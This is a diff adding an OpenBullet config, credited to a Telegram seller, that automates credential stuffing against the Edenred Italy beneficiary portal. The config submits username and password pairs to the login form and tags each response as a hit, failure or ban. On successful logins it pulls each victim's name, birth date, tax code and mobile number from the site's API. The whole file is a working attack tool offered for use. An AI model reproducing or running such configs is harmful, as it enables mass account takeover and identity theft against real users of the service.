@@ -1,0 +1,158 @@
+[SETTINGS]
+{
+  "Name": "beneficiari.edenred.it",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-04T18:53:51.8888682+04:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@wanted_boy",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://beneficiari.edenred.it/" 
+  
+  HEADER "Host: beneficiari.edenred.it" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+BEGIN SCRIPT JavaScript
+Time = Date.now();
+END SCRIPT -> VARS "Time"
+
+#ADRUM_BTa FUNCTION Constant "<COOKIES(ADRUM_BTa)>" -> VAR "ADRUM_BTa" 
+
+#SameSite FUNCTION Constant "<COOKIES(SameSite)>" -> VAR "SameSite" 
+
+#JSESSIONID FUNCTION Constant "<COOKIES(JSESSIONID)>" -> VAR "JSESSIONID" 
+
+#ADRUM_BT1 FUNCTION Constant "<COOKIES(ADRUM_BT1)>" -> VAR "ADRUM_BT1" 
+
+#COOKIE_SUPPORT FUNCTION Constant "<COOKIES(COOKIE_SUPPORT)>" -> VAR "COOKIE_SUPPORT" 
+
+#GUEST_LANGUAGE_ID FUNCTION Constant "<COOKIES(GUEST_LANGUAGE_ID)>" -> VAR "GUEST_LANGUAGE_ID" 
+
+#TS01ac0233 FUNCTION Constant "<COOKIES(TS01ac0233)>" -> VAR "TS01ac0233" 
+
+#ClearCookies FUNCTION ClearCookies "<COOKIES>" -> VAR "ClearCookies" 
+
+#Login REQUEST POST "https://beneficiari.edenred.it/login?p_p_id=58&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view&p_p_col_id=column-1&p_p_col_count=4&_58_struts_action=%2Flogin%2Flogin" AutoRedirect=FALSE EncodeContent=TRUE 
+  CONTENT "_58_formDate=<Time>&_58_saveLastPath=false&_58_redirect=&_58_doActionAfterLogin=false&_58_login=<USER>&_58_password=<PASS>&_58_rememberMe=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "ADRUM_BTa: <ADRUM_BTa>" 
+  COOKIE "SameSite: <SameSite>" 
+  COOKIE "JSESSIONID: <JSESSIONID>" 
+  COOKIE "ADRUM_BT1: <ADRUM_BT1>" 
+  COOKIE "COOKIE_SUPPORT: <COOKIE_SUPPORT>" 
+  COOKIE "GUEST_LANGUAGE_ID: <GUEST_LANGUAGE_ID>" 
+  COOKIE "TS01ac0233: <TS01ac0233>" 
+  HEADER "Host: beneficiari.edenred.it" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Origin: https://beneficiari.edenred.it" 
+  HEADER "Referer: https://beneficiari.edenred.it/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES(USER_UUID)>" Exists 
+  KEYCHAIN Failure OR 
+    KEY "<HEADERS(Location)>" Contains "false&_58_login=" 
+  KEYCHAIN Ban OR 
+    KEY "<APM_DO_NOT_TOUCH>" 
+
+#Get REQUEST GET "https://beneficiari.edenred.it/group/portale-beneficiari" 
+  
+  HEADER "Host: beneficiari.edenred.it" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://beneficiari.edenred.it/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#username PARSE "<SOURCE>" LR "username\":\"" "\"" -> VAR "username" 
+
+#authToken PARSE "<SOURCE>" LR "Liferay.authToken = '" "'" -> VAR "authToken" 
+
+#Post REQUEST POST "https://beneficiari.edenred.it/api/jsonws/invoke" 
+  CONTENT "cmd=%7B%22%2FRIS_Beneficiari-portlet.restinsoap%2Fget-session-object%22%3A%7B%22parameter%22%3A%22%7B%5C%22username%5C%22%3A%5C%22<username>%5C%22%7D%22%7D%7D&p_auth=<authToken>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: beneficiari.edenred.it" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0" 
+  HEADER "Accept: application/json, text/javascript, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Adrum: isAjax:true" 
+  HEADER "Origin: https://beneficiari.edenred.it" 
+  HEADER "Referer: https://beneficiari.edenred.it/group/portale-beneficiari/dati-personali" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#lastName PARSE "<SOURCE>" JSON "nome" CreateEmpty=FALSE -> CAP "lastName" 
+
+#firstName PARSE "<SOURCE>" JSON "cognome" CreateEmpty=FALSE -> CAP "firstName" 
+
+#dob PARSE "<SOURCE>" JSON "dataNascita" CreateEmpty=FALSE -> CAP "dob" 
+
+#taxCode PARSE "<SOURCE>" JSON "codFiscale" CreateEmpty=FALSE -> CAP "taxCode" 
+
+#mobile PARSE "<SOURCE>" JSON "cellulare" CreateEmpty=FALSE -> CAP "mobile" 
+
+#PositionInCompany PARSE "<SOURCE>" JSON "residCap" CreateEmpty=FALSE -> CAP "PositionInCompany" 
+
+SET CAP "Author Telegram" "@wanted_boy"
+SET CAP "Telegram Channel" "https://t.me/OpenBulletConfigs"
+
